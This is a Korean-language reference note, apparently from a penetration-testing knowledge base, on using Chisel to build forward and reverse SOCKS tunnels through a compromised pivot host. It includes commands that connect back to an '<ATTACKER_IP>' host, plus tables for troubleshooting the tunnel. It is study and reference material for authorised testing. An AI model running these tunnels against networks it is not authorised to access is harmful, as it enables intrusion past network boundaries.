---
tags:
  - 기능/피벗
실행환경: ["Linux", "Windows"]
필요권한: ["피벗 호스트 셸"]
필요조건: ["agent를 실행할 수 있는 내부 호스트 접근", "양단 간 연결 가능한 수신 포트"]
결과: ["네트워크 접근", "터널"]
---

# chisel

## 도구 개요

Chisel은 서버와 클라이언트 사이에 지정 TCP 포트 또는 SOCKS 프록시를 중계하는 터널링 도구다. 공격 호스트가 피벗 호스트의 listener에 연결할 수 있으면 정방향 SOCKS를, 피벗 호스트에서만 공격 호스트로 연결할 수 있으면 역방향 SOCKS를 구성하기 좋다.

## 필요한 입력과 실행 환경

- 실행 위치: 정방향은 피벗 호스트의 `server`와 공격 호스트의 `client`, 역방향은 공격 호스트의 `server`와 피벗 호스트의 `client`; 양쪽에서 호환되는 버전의 실행 파일을 준비한다.
- 필요한 입력: 양단이 연결할 수 있는 수신 주소와 포트, 정방향 `socks` 또는 역방향 `R:socks`
- 후속 환경: SOCKS를 사용할 때는 로컬 SOCKS 포트와 `proxychains` 설정이 일치해야 한다.


## 표준 사용법

```bash
chisel server -p <PORT> --socks5
chisel client <PIVOT_IP>:<PORT> socks
chisel server -p <PORT> --reverse --socks5
chisel client <SERVER_IP>:<PORT> R:socks
```

## 대표 예시

### 피벗 호스트에서 정방향 SOCKS 서버 실행

```bash
./chisel server -v -p 1234 --socks5
```

### 공격 호스트에서 정방향 SOCKS client 실행

```bash
./chisel client -v <PIVOT_IP>:1234 socks
```

확인할 출력:

- client에 `proxy#127.0.0.1:1080=>socks: Listening`, `Connected`, `SSH connected`가 표시된다.
- 로컬 `1080` listener 생성은 Chisel 연결 성공이며 내부 서비스 도달이나 인증 성공은 아니다.

### 공격 호스트에서 reverse tunnel 서버 실행

```bash
./chisel server -p 8000 --reverse
```

### 피벗 호스트에서 reverse SOCKS 연결

```bash
./chisel client <ATTACKER_IP>:8000 R:1083:socks
```


## 주요 옵션

| 옵션 | 설명 |
| --- | --- |
| `server`, `client` | 서버/클라이언트 모드 선택 |
| `-p` | 서버 수신 포트 |
| `--socks5` | server가 SOCKS5 연결을 처리하도록 설정 |
| `--reverse` | reverse tunnel 허용 |
| `R:` | reverse tunnel 지정 |
| `socks` | SOCKS proxy 생성 |
| `--auth` | 인증 정보 설정 |
| `--proxy` | 상위 HTTP proxy 사용 |


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| client connected / session opened | 터널 연결 성공 | 로컬 포트 또는 socks 포트로 내부 서비스 접근 확인 |
| `proxy#127.0.0.1:1080=>socks: Listening` | 정방향 client에 로컬 SOCKS listener 생성 | ProxyChains를 SOCKS5 `127.0.0.1:1080`에 맞추고 실제 내부 TCP 응답 확인 |
| reverse client 연결 뒤 `127.0.0.1:1083` listen | Windows 피벗을 통한 reverse SOCKS 생성 | `chisel-socks.conf`를 SOCKS5 `127.0.0.1:1083`으로 지정하고 내부 TCP 확인 |
| `R:` reverse 포트 listen | reverse tunnel 준비 완료 | 공격자 호스트에서 해당 포트로 서비스 접근 테스트 |
| client가 server에 연결하지 못함 | server 주소/포트 접근 불가 또는 포트 충돌 | listen 주소, 방화벽, VPN/TUN IP와 server 로그 확인 |
| 터널 연결 후 connection refused/timeout | 내부 대상 주소/포트 또는 피벗 호스트의 도달성 문제 | 피벗 호스트 관점의 내부 IP/포트와 양쪽 로그 확인 |
| SOCKS 요청 실패 | 로컬 proxy 포트나 SOCKS 버전 설정 불일치 | `proxychains.conf`, SOCKS 버전과 listen 포트 확인 |
| reconnect 반복 | 네트워크 불안정 또는 프록시 문제 | keepalive, 포트, 방화벽, 실행 위치 확인 |

## 관련 공격기법

- [[Chisel SOCKS 터널링]]
